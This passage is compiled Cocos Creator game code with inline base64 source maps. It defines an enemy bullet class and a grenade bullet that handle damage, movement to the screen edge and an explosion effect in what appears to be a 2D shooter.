lmZiA9IGNmZ1snc3RpZmYnXTtcclxuICAgICAgICBsZXQgY29uZmlnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uKVswXTtcclxuICAgICAgICB0aGlzLmh1cnQgPSBNYXRoLmZsb29yKGNvbmZpZ1snaHVydCddKldvcmxkLk15LmFybW9yeS5odXJ0TXVsT2YoMSkpKmNmZ1snaHVydCddO1xyXG4gICAgfVxyXG5cclxuICAgIG9uTG9hZCgpOiB2b2lkIHtcclxuICAgICAgICBzdXBlci5vbkxvYWQoKTtcclxuICAgICAgICB0aGlzLmluaXQoNSk7XHJcbiAgICAgICAgdGhpcy5fc2tlID0gdGhpcy5nZXRDb21wb25lbnQoc3AuU2tlbGV0b24pO1xyXG4gICAgICAgIHRoaXMuX3NrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wQ291bnQpID0+IHtcclxuICAgICAgICAgICAgbGV0IG5hbWUgPSB0cmFja0VudHJ5LmFuaW1hdGlvbiA/IHRyYWNrRW50cnkuYW5pbWF0aW9uLm5hbWUgOiAnJztcclxuICAgICAgICAgICAgLy8gY29uc29sZS5sb2coXCI9PT09PT09PT09PT09PmNvbXBsZXRlTGlzLi5cIiwgbmFtZSk7XHJcbiAgICAgICAgICAgIGlmIChuYW1lID09IFwic3RhcnRcIiB8fCBuYW1lID09IFwidHJhbnNpdGlvblwiKXtcclxuICAgICAgICAgICAgICAgIHRoaXMuX3NrZS5zZXRBbmltYXRpb24oMCwgXCJsb29wc1wiLCBmYWxzZSk7XHJcbiAgICAgICAgICAgICAgICBpZiAoIXRoaXMubm9kZS5nZXRBY3Rpb25CeVRhZygxMTQpKXtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgc3BlZWRBY3Rpb24gPSBjYy5zcGVlZChjYy5yZXBlYXRGb3JldmVyKGNjLnJvdGF0ZUJ5KDEuMjUsIDcyMCkpLCAwKTtcclxuICAgICAgICAgICAgICAgICAgICBzcGVlZEFjdGlvbi5zZXRUYWcoMTE0KTtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKHNwZWVkQWN0aW9uKTtcclxuICAgICAgICAgICAgICAgICAgICBjYy50d2VlbihzcGVlZEFjdGlvbilcclxuICAgICAgICAgICAgICAgICAgICAgICAgLnRvKDEsIHtfc3BlZWQ6MX0sIHsgZWFzaW5nOiAnc2luZUluJ30pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIC5zdGFydCgpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgd2luZG93WydHYW1lUm9sZUNvbnRyb2xsZXInXS5yb2xlLm5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuUE9TSVRJT05fQ0hBTkdFRCwgKCk9PntcclxuICAgICAgICAgICAgdGhpcy5ub2RlLnBvc2l0aW9uID0gd2luZG93WydHYW1lUm9sZUNvbnRyb2xsZXInXS5yb2xlLm5vZGUucG9zaXRpb247XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgYmxpbmsoKXtcclxuICAgICAgICB0aGlzLnVuYmxpbmsoKTtcclxuICAgICAgICBsZXQgYWN0aW9uID0gY2MucmVwZWF0Rm9yZXZlcihjYy5zZXF1ZW5jZShjYy5mYWRlVG8oMC4xLCAwKSwgY2MuZmFkZVRvKDAuMSwgMjU1KSkpO1xyXG4gICAgICAgIGFjdGlvbi5zZXRUYWcoNDg1KTtcclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGFjdGlvbik7XHJcbiAgICB9XHJcblxyXG4gICAgdW5ibGluaygpe1xyXG4gICAgICAgIHRoaXMubm9kZS5zdG9wQWN0aW9uQnlUYWcoNDg1KTtcclxuICAgICAgICB0aGlzLm5vZGUub3BhY2l0eSA9IDI1NTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRpc2FibGUoKTogdm9pZCB7XHJcbiAgICAgICAgdGhpcy51bmJsaW5rKCk7XHJcbiAgICAgICAgc3VwZXIub25EaXNhYmxlKCk7XHJcbiAgICAgICAgd2luZG93WydHYW1lUm9sZUNvbnRyb2xsZXInXS5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzID0gMjU7XHJcbiAgICB9XHJcblxyXG4gICAgcHJvdGVjdGVkIG9uRW5hYmxlKCk6IHZvaWQge1xyXG4gICAgICAgIHN1cGVyLm9uRW5hYmxlKCk7XHJcbiAgICAgICAgd2luZG93WydHYW1lUm9sZUNvbnRyb2xsZXInXS5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzID0gODA7XHJcbiAgICAgICAgdGhpcy5ub2RlLnBvc2l0aW9uID0gd2luZG93WydHYW1lUm9sZUNvbnRyb2xsZXInXS5yb2xlLm5vZGUucG9zaXRpb247XHJcbiAgICAgICAgdGhpcy5ub2RlLnN0b3BBbGxBY3Rpb25zKCk7XHJcbiAgICAgICAgdGhpcy5fc2tlLnNldEFuaW1hdGlvbigwLCBcInN0YXJ0XCIsIGZhbHNlKTtcclxuICAgIH1cclxuXHJcbiAgICAvKnVwZGF0ZShkdDpudW1iZXIpe1xyXG4gICAgICAgIGlmIChHYW1lUHJveHkucGF1c2VHYW1lKXJldHVybjtcclxuICAgICAgICBpZiAodGhpcy5ub2RlLmNvbG9yLmdldFIoKSA8IDI1NSl7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5jb2xvci5zZXRSKHRoaXMubm9kZS5jb2xvci5nZXRSKCkgKyAxKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKHRoaXMubm9kZS5jb2xvci5nZXRHKCkgPCAyNTUpe1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuY29sb3Iuc2V0Ryh0aGlzLm5vZGUuY29sb3IuZ2V0RygpICsgMSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGlmICh0aGlzLm5vZGUuY29sb3IuZ2V0QigpIDwgMjU1KXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmNvbG9yLnNldEIodGhpcy5ub2RlLmNvbG9yLmdldEIoKSArIDEpO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLl9pbXBlbmV0cmFibGVEZWZlbmNlQ0QgLT0gZHQ7XHJcbiAgICAgICAgaWYgKHRoaXMuX2ltcGVuZXRyYWJsZURlZmVuY2VDRCA8PSAwKXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH1cclxuICAgIH0qL1xyXG5cclxuXHJcbiAgICBvbkNvbGxpc2lvblN0YXkob3RoZXIsIHNlbGYpIHtcclxuICAgICAgICB0aGlzLnN0cmlrZShvdGhlciwgc2VsZik7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHByb3RlY3RlZCBjb2xsaXNpb25FbmVteShvdGhlciwgc2VsZik6IHZvaWQge1xyXG4gICAgICAgIHRoaXMuc3RyaWtlKG90aGVyLCBzZWxmKTtcclxuICAgICAgICBsZXQgZW5lbXkgPSBvdGhlci5nZXRDb21wb25lbnQoJ0VuZW15Jyk7XHJcbiAgICAgICAgLyoqIOWDteehrCAqL1xyXG4gICAgICAgIGlmICh0aGlzLnN0aWZmID4gMCl7XHJcbiAgICAgICAgICAgIGVuZW15LmRvU3RpZmYodGhpcy5zdGlmZik7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIC8qKiDlh4/pgJ8gKi9cclxuICAgICAgICBlbmVteS5kb1NwZWVkY3V0KCk7XHJcbiAgICAgICAgLyoqIOWHu+mAgOaViOaenCAqL1xyXG4gICAgICAgIHRoaXMuZG9SZXBlYWwoZW5lbXksIHRoaXMucmVwZWwpO1xyXG5cclxuICAgICAgICAvKiog6aOY6KGA5pWI5p6cICovXHJcbiAgICAgICAgbGV0IGRhbWFnZSA9IHRoaXMuaHVydDtcclxuICAgICAgICBpZiAoZGFtYWdlID4gMCl7XHJcbiAgICAgICAgICAgIGVuZW15LmhwIC09IGRhbWFnZTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgZG9SZXBlYWwoZW5lbXksIHJlcGVsKTogdm9pZCB7XHJcbiAgICAgICAgZW5lbXkuZG9SZXBlbChlbmVteS5ub2RlLnBvc2l0aW9uLnN1Yih0aGlzLm5vZGUucG9zaXRpb24pLm5vcm1hbGl6ZSgpLCByZXBlbCk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletOfEnemy.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'be01bjDEqJBnot/Ow1MalHA', 'BulletOfEnemy');
// script/app/entities/bullet/BulletOfEnemy.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var GameProxy_1 = require("../../game/GameProxy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletOfEnemy = /** @class */ (function (_super) {
    __extends(BulletOfEnemy, _super);
    function BulletOfEnemy() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    BulletOfEnemy.prototype.init = function (id) {
        this.bulletId = id;
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Enemy)[id % 100 - 1];
        this.bThrought = false;
        this.hurt = Math.floor(config['hurt'] * GameProxy_1.GameProxy.enemyHurtMulOf(config['id']));
        this.repel = 0;
        this.stiff = 0;
    };
    BulletOfEnemy.prototype.onEnable = function () {
        window['GameBulletsController'].enemyBullets.push(this);
    };
    BulletOfEnemy.prototype.onDisable = function () {
        this.node.stopAllActions();
        this._contacts.length = 0;
        var gameBulletsController = window['GameBulletsController'];
        gameBulletsController.enemyBullets.splice(gameBulletsController.enemyBullets.indexOf(this), 1);
    };
    BulletOfEnemy.prototype.onCollisionEnter = function (other, self) {
        console.log("角色被子弹击中");
        window['GameRoleController'].hp -= this.hurt;
        if (!this.bThrought) {
            this.node.active = false;
        }
    };
    BulletOfEnemy.prototype.onCollisionStay = function (other, self) {
        // super.onCollisionStay(other, self);
    };
    BulletOfEnemy.prototype.onCollisionExit = function (other, self) {
        // super.onCollisionExit(other, self);
    };
    BulletOfEnemy = __decorate([
        ccclass
    ], BulletOfEnemy);
    return BulletOfEnemy;
}(Bullet_1.default));
exports.default = BulletOfEnemy;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZkVuZW15LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxtQ0FBOEI7QUFDOUIsZ0VBQTZEO0FBQzdELHdFQUFxRTtBQUNyRSxrREFBK0M7QUFFekMsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBMkMsaUNBQU07SUFBakQ7O0lBc0NBLENBQUM7SUFuQ0csNEJBQUksR0FBSixVQUFLLEVBQVU7UUFDWCxJQUFJLENBQUMsUUFBUSxHQUFHLEVBQUUsQ0FBQztRQUNuQixJQUFJLE1BQU0sR0FBRyx5QkFBVyxDQUFDLGFBQWEsQ0FBQyxpQ0FBZSxDQUFDLEtBQUssQ0FBQyxDQUFDLEVBQUUsR0FBQyxHQUFHLEdBQUMsQ0FBQyxDQUFDLENBQUM7UUFDeEUsSUFBSSxDQUFDLFNBQVMsR0FBRyxLQUFLLENBQUM7UUFDdkIsSUFBSSxDQUFDLElBQUksR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsR0FBRyxxQkFBUyxDQUFDLGNBQWMsQ0FBQyxNQUFNLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDO1FBQ2hGLElBQUksQ0FBQyxLQUFLLEdBQUcsQ0FBQyxDQUFDO1FBQ2YsSUFBSSxDQUFDLEtBQUssR0FBRyxDQUFDLENBQUM7SUFDbkIsQ0FBQztJQUVELGdDQUFRLEdBQVI7UUFDSSxNQUFNLENBQUMsdUJBQXVCLENBQUMsQ0FBQyxZQUFZLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO0lBQzVELENBQUM7SUFFRCxpQ0FBUyxHQUFUO1FBQ0ksSUFBSSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQztRQUMzQixJQUFJLENBQUMsU0FBUyxDQUFDLE1BQU0sR0FBRyxDQUFDLENBQUM7UUFDMUIsSUFBSSxxQkFBcUIsR0FBRyxNQUFNLENBQUMsdUJBQXVCLENBQUMsQ0FBQztRQUM1RCxxQkFBcUIsQ0FBQyxZQUFZLENBQUMsTUFBTSxDQUFDLHFCQUFxQixDQUFDLFlBQVksQ0FBQyxPQUFPLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUM7SUFDbkcsQ0FBQztJQUVELHdDQUFnQixHQUFoQixVQUFpQixLQUFLLEVBQUUsSUFBSTtRQUN4QixPQUFPLENBQUMsR0FBRyxDQUFDLFNBQVMsQ0FBQyxDQUFDO1FBQ3ZCLE1BQU0sQ0FBQyxvQkFBb0IsQ0FBQyxDQUFDLEVBQUUsSUFBSSxJQUFJLENBQUMsSUFBSSxDQUFDO1FBQzdDLElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxFQUFDO1lBQ2hCLElBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztTQUM1QjtJQUNMLENBQUM7SUFFRCx1Q0FBZSxHQUFmLFVBQWdCLEtBQUssRUFBRSxJQUFJO1FBQ3ZCLHNDQUFzQztJQUMxQyxDQUFDO0lBRUQsdUNBQWUsR0FBZixVQUFnQixLQUFLLEVBQUUsSUFBSTtRQUN2QixzQ0FBc0M7SUFDMUMsQ0FBQztJQXJDZ0IsYUFBYTtRQURqQyxPQUFPO09BQ2EsYUFBYSxDQXNDakM7SUFBRCxvQkFBQztDQXRDRCxBQXNDQyxDQXRDMEMsZ0JBQU0sR0FzQ2hEO2tCQXRDb0IsYUFBYSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQnVsbGV0IGZyb20gXCIuL0J1bGxldFwiO1xyXG5pbXBvcnQge0V4Y2VsVGFibGVOYW1lc30gZnJvbSBcIi4uLy4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuaW1wb3J0IHtFeGNlbENvbmZpZ30gZnJvbSBcIi4uLy4uLy4uLy4uL2ZyYW1ld29yay9jb25maWcvRXhjZWxDb25maWdcIjtcclxuaW1wb3J0IHtHYW1lUHJveHl9IGZyb20gXCIuLi8uLi9nYW1lL0dhbWVQcm94eVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBCdWxsZXRPZkVuZW15IGV4dGVuZHMgQnVsbGV0IHtcclxuXHJcblxyXG4gICAgaW5pdChpZDogbnVtYmVyKTogdm9pZCB7XHJcbiAgICAgICAgdGhpcy5idWxsZXRJZCA9IGlkO1xyXG4gICAgICAgIGxldCBjb25maWcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5FbmVteSlbaWQlMTAwLTFdO1xyXG4gICAgICAgIHRoaXMuYlRocm91Z2h0ID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5odXJ0ID0gTWF0aC5mbG9vcihjb25maWdbJ2h1cnQnXSAqIEdhbWVQcm94eS5lbmVteUh1cnRNdWxPZihjb25maWdbJ2lkJ10pKTtcclxuICAgICAgICB0aGlzLnJlcGVsID0gMDtcclxuICAgICAgICB0aGlzLnN0aWZmID0gMDtcclxuICAgIH1cclxuXHJcbiAgICBvbkVuYWJsZSgpe1xyXG4gICAgICAgIHdpbmRvd1snR2FtZUJ1bGxldHNDb250cm9sbGVyJ10uZW5lbXlCdWxsZXRzLnB1c2godGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgb25EaXNhYmxlKCl7XHJcbiAgICAgICAgdGhpcy5ub2RlLnN0b3BBbGxBY3Rpb25zKCk7XHJcbiAgICAgICAgdGhpcy5fY29udGFjdHMubGVuZ3RoID0gMDtcclxuICAgICAgICBsZXQgZ2FtZUJ1bGxldHNDb250cm9sbGVyID0gd2luZG93WydHYW1lQnVsbGV0c0NvbnRyb2xsZXInXTtcclxuICAgICAgICBnYW1lQnVsbGV0c0NvbnRyb2xsZXIuZW5lbXlCdWxsZXRzLnNwbGljZShnYW1lQnVsbGV0c0NvbnRyb2xsZXIuZW5lbXlCdWxsZXRzLmluZGV4T2YodGhpcyksIDEpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uQ29sbGlzaW9uRW50ZXIob3RoZXIsIHNlbGYpIHtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIuinkuiJsuiiq+WtkOW8ueWHu+S4rVwiKTtcclxuICAgICAgICB3aW5kb3dbJ0dhbWVSb2xlQ29udHJvbGxlciddLmhwIC09IHRoaXMuaHVydDtcclxuICAgICAgICBpZiAoIXRoaXMuYlRocm91Z2h0KXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBvbkNvbGxpc2lvblN0YXkob3RoZXIsIHNlbGYpIHtcclxuICAgICAgICAvLyBzdXBlci5vbkNvbGxpc2lvblN0YXkob3RoZXIsIHNlbGYpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uQ29sbGlzaW9uRXhpdChvdGhlciwgc2VsZikge1xyXG4gICAgICAgIC8vIHN1cGVyLm9uQ29sbGlzaW9uRXhpdChvdGhlciwgc2VsZik7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletOfShouLei.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '083284vH5tL8raqVw3y/gbv', 'BulletOfShouLei');
// script/app/entities/bullet/BulletOfShouLei.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var Facade_1 = require("../../../../framework/facade/Facade");
var GameProxy_1 = require("../../game/GameProxy");
var World_1 = require("../../info/World");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletOfShouLei = /** @class */ (function (_super) {
    __extends(BulletOfShouLei, _super);
    function BulletOfShouLei() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._ske = null;
        _this._bounds = cc.rect();
        _this._gameExplosivesController = null;
        return _this;
    }
    BulletOfShouLei.prototype.strike = function (other, self) {
        // super.strike(other, self);
    };
    BulletOfShouLei.prototype.init = function (id) {
        this.bulletId = id;
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Prop)[this.bulletId - 1];
        this.bThrought = cfg['pierce'] === 1;
        this.repel = cfg['repel'];
        this.stiff = cfg['stiff'];
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[0];
        this.hurt = Math.floor(config['hurt'] * World_1.World.My.armory.hurtMulOf(1)) * cfg['hurt'];
        var bgNode = cc.find('Canvas').getChildByName('GameScene').getChildByName('shakeNode').getChildByName('bg');
        this._bounds.x = -bgNode.width / 2;
        this._bounds.y = -bgNode.height / 2;
        this._bounds.width = bgNode.width;
        this._bounds.height = bgNode.height;
    };
    BulletOfShouLei.prototype.onLoad = function () {
        _super.prototype.onLoad.call(this);
        this._ske = this.getComponent(sp.Skeleton);
        this._gameExplosivesController = Facade_1.default.findComponent("GameScene", "GameExplosivesController");
    };
    BulletOfShouLei.prototype.move = function (dir) {
        var _this = this;
        if (this.node.x <= this._bounds.xMin || this.node.x >= this._bounds.xMax || this.node.y <= this._bounds.yMin || this.node.y >= this._bounds.yMax) {
            this.node.active = false;
            return;
        }
        this._ske.setAnimation(0, "animation", true);
        /** 计算终点 */
        var destPos = dir.mul(this._bounds.height + this._bounds.width);
        var intersections = [];
        if (dir.x > 0) {
            //右边界
            if (destPos.x >= this._bounds.xMax) {
                var point = cc.v2();
                if (cc.Intersection.pLineIntersect(this.node.position, destPos, cc.v2(this._bounds.xMax, this._bounds.yMin), cc.v2(this._bounds.xMax, this._bounds.yMax), point)) {
                    intersections.push(point);
                }
            }
        }
        else if (dir.x < 0) {
            //左边界
            if (destPos.x <= this._bounds.xMin) {
                var point = cc.v2();
                if (cc.Intersection.pLineIntersect(this.node.position, destPos, cc.v2(this._bounds.xMin, this._bounds.yMin), cc.v2(this._bounds.xMin, this._bounds.yMax), point)) {
                    intersections.push(point);
                }
            }
        }
        if (dir.y > 0) {
            //上边界
            if (destPos.y >= this._bounds.yMax) {
                var point = cc.v2();
                if (cc.Intersection.pLineIntersect(this.node.position, destPos, cc.v2(this._bounds.xMin, this._bounds.yMax), cc.v2(this._bounds.xMax, this._bounds.yMax), point)) {
                    intersections.push(point);
                }
            }
        }
        else if (dir.y < 0) {
            //上边界
            if (destPos.y <= this._bounds.yMin) {
                var point = cc.v2();
                if (cc.Intersection.pLineIntersect(this.node.position, destPos, cc.v2(this._bounds.xMin, this._bounds.yMin), cc.v2(this._bounds.xMax, this._bounds.yMin), point)) {
                    intersections.push(point);
                }
            }
        }
        if (intersections.length > 0) {
            // console.log("重新计算destPos===>intersections", intersections);
            /** 重新计算destPos */
            if (intersections.length == 1) {
                destPos = intersections[0];
            }
            else {
                /** 取距离怪物最近的那个点 */
                var p = intersections[0];
                var minDistance = p.sub(this.node.position).mag();
                for (var i = 1; i < intersections.length; i++) {
                    var mag = intersections[i].sub(this.node.position).mag();
                    if (mag < minDistance) {
                        p = intersections[i];
                        minDistance = mag;
                    }
                }
                destPos = p;
            }
        }
        var distance = destPos.sub(this.node.position).mag();
        var speed = 50;
        var action = cc.sequence(cc.moveTo(distance / speed, destPos), cc.callFunc(function () {
            _this.node.active = false;
        }));
        this.node.runAction(action);
    };
    BulletOfShouLei.prototype.onCollisionEnter = function (other, self) {
        /** 爆炸 */
        this.node.active = false;
        this.boom();
    };
    BulletOfShouLei.prototype.boom = function () {
        var explosiveHuoJianTong = this._gameExplosivesController.getInactiveExplosive(9);
        explosiveHuoJianTong.node.position = this.node.position;
        explosiveHuoJianTong.node.active = true;
        explosiveHuoJianTong.node.scale = 0.5;
        explosiveHuoJianTong.node.rotation = Math.random() * 360;
        explosiveHuoJianTong.boom();
        GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.ShakeScreen, 0.08, 2, 2);
    };
    BulletOfShouLei = __decorate([
        ccclass
    ], BulletOfShouLei);
    return BulletOfShouLei;
}(Bullet_1.default));
exports.default = BulletOfShouLei;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZlNob3VMZWkudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLG1DQUE4QjtBQUM5Qiw4REFBeUQ7QUFDekQsa0RBQStDO0FBQy9DLDBDQUF1QztBQUN2Qyx3RUFBcUU7QUFDckUsZ0VBQTZEO0FBRXZELElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQTZDLG1DQUFNO0lBQW5EO1FBQUEscUVBNEhDO1FBMUhXLFVBQUksR0FBZSxJQUFJLENBQUM7UUFFeEIsYUFBTyxHQUFXLEVBQUUsQ0FBQyxJQUFJLEVBQUUsQ0FBQztRQUU1QiwrQkFBeUIsR0FBRyxJQUFJLENBQUM7O0lBc0g3QyxDQUFDO0lBbkhHLGdDQUFNLEdBQU4sVUFBTyxLQUFLLEVBQUUsSUFBSTtRQUNkLDZCQUE2QjtJQUNqQyxDQUFDO0lBRUQsOEJBQUksR0FBSixVQUFLLEVBQVU7UUFDWCxJQUFJLENBQUMsUUFBUSxHQUFHLEVBQUUsQ0FBQztRQUNuQixJQUFJLEdBQUcsR0FBRyx5QkFBVyxDQUFDLGFBQWEsQ0FBQyxpQ0FBZSxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUMsQ0FBQyxDQUFDLENBQUM7UUFDM0UsSUFBSSxDQUFDLFNBQVMsR0FBRyxHQUFHLENBQUMsUUFBUSxDQUFDLEtBQUssQ0FBQyxDQUFDO1FBQ3JDLElBQUksQ0FBQyxLQUFLLEdBQUcsR0FBRyxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQzFCLElBQUksQ0FBQyxLQUFLLEdBQUcsR0FBRyxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQzFCLElBQUksTUFBTSxHQUFHLHlCQUFXLENBQUMsYUFBYSxDQUFDLGlDQUFlLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDbEUsSUFBSSxDQUFDLElBQUksR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsR0FBQyxhQUFLLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxTQUFTLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBQyxHQUFHLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDaEYsSUFBSSxNQUFNLEdBQUcsRUFBRSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQyxjQUFjLENBQUMsV0FBVyxDQUFDLENBQUMsY0FBYyxDQUFDLFdBQVcsQ0FBQyxDQUFDLGNBQWMsQ0FBQyxJQUFJLENBQUMsQ0FBQztRQUM1RyxJQUFJLENBQUMsT0FBTyxDQUFDLENBQUMsR0FBRyxDQUFFLE1BQU0sQ0FBQyxLQUFLLEdBQUMsQ0FBQyxDQUFDO1FBQ2xDLElBQUksQ0FBQyxPQUFPLENBQUMsQ0FBQyxHQUFHLENBQUUsTUFBTSxDQUFDLE1BQU0sR0FBQyxDQUFDLENBQUM7UUFDbkMsSUFBSSxDQUFDLE9BQU8sQ0FBQyxLQUFLLEdBQUcsTUFBTSxDQUFDLEtBQUssQ0FBQztRQUNsQyxJQUFJLENBQUMsT0FBTyxDQUFDLE1BQU0sR0FBRyxNQUFNLENBQUMsTUFBTSxDQUFDO0lBQ3hDLENBQUM7SUFHRCxnQ0FBTSxHQUFOO1FBQ0ksaUJBQU0sTUFBTSxXQUFFLENBQUM7UUFDZixJQUFJLENBQUMsSUFBSSxHQUFHLElBQUksQ0FBQyxZQUFZLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQzNDLElBQUksQ0FBQyx5QkFBeUIsR0FBRyxnQkFBTSxDQUFDLGFBQWEsQ0FBQyxXQUFXLEVBQUUsMEJBQTBCLENBQUMsQ0FBQztJQUNuRyxDQUFDO0lBR0QsOEJBQUksR0FBSixVQUFLLEdBQVk7UUFBakIsaUJBdUVDO1FBdEVHLElBQUksSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksSUFBSSxDQUFDLE9BQU8sQ0FBQyxJQUFJLElBQUksSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksSUFBSSxDQUFDLE9BQU8sQ0FBQyxJQUFJLElBQUksSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksSUFBSSxDQUFDLE9BQU8sQ0FBQyxJQUFJLElBQUksSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksSUFBSSxDQUFDLE9BQU8sQ0FBQyxJQUFJ